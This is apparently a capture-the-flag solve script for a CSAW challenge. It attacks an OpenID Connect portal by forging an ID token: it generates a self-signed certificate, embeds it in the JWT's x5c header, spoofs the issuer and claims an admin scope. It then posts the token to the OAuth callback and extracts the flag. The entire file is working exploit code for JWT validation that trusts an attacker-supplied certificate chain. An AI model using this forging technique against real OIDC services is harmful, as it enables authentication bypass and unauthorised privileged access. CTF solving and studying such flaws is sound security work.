import base64, datetime as dt, http.cookiejar, urllib.request, urllib.error
import jwt as pyjwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes, serialization
from cryptography import x509
from cryptography.x509.oid import NameOID

TARGET = "http://trustdinoidc.chal.csaw.io:8990"
CLIENT_ID = "trustdinoidc-portal"
ADMIN_SCOPE = "openid profile flagosaurus:redeem"

def forge(iss, scope):
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "attacker")])
    cert = (x509.CertificateBuilder()
            .subject_name(name).issuer_name(name)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(dt.datetime.now(dt.timezone.utc))
            .not_valid_after(dt.datetime.now(dt.timezone.utc) + dt.timedelta(days=1))
            .sign(key, hashes.SHA256()))
    der = cert.public_bytes(serialization.Encoding.DER)
    payload = {"iss": iss, "sub": "attacker", "aud": CLIENT_ID, "scope": scope,
               "exp": dt.datetime.now(dt.timezone.utc) + dt.timedelta(hours=1)}
    return pyjwt.encode(payload, key, algorithm="RS256", headers={"x5c": [base64.b64encode(der).decode()]})

def submit(token):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    print(f"Token:\n{token}\n")
    req = urllib.request.Request(f"{TARGET}/oauth/callback", data=f"id_token={token}".encode(), method="POST")
    try:
        opener.open(req)
    except urllib.error.HTTPError as e:
        return None, f"{e.code} {e.read().decode()}"
    return opener.open(f"{TARGET}/").read().decode(), None

print("[*] forging against strataid.example.com")
token = forge("strataid.example.com", ADMIN_SCOPE)

body, err = submit(token)
if err:
    print(f"Error: {err}")
else:
    print("Response body:")
    print(body)
    if "csaw{" in body:
        flag = body[body.find("csaw{"):body.find("}", body.find("csaw{")) + 1]
        print(f"[+] flag: {flag}")
    else:
        print("No flag found in response")